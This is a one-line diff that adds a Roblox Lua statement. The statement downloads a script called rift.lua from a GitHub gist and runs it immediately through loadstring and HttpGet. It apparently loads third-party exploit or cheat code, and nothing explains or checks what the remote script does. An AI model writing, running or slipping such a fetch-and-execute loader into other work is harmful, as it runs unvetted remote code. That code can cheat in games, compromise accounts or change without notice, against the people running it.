@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://gist.githubusercontent.com/DeveloperMikey/0787e77a45d5f1f9a5de709d71ff2f25/raw/rift.lua"))()
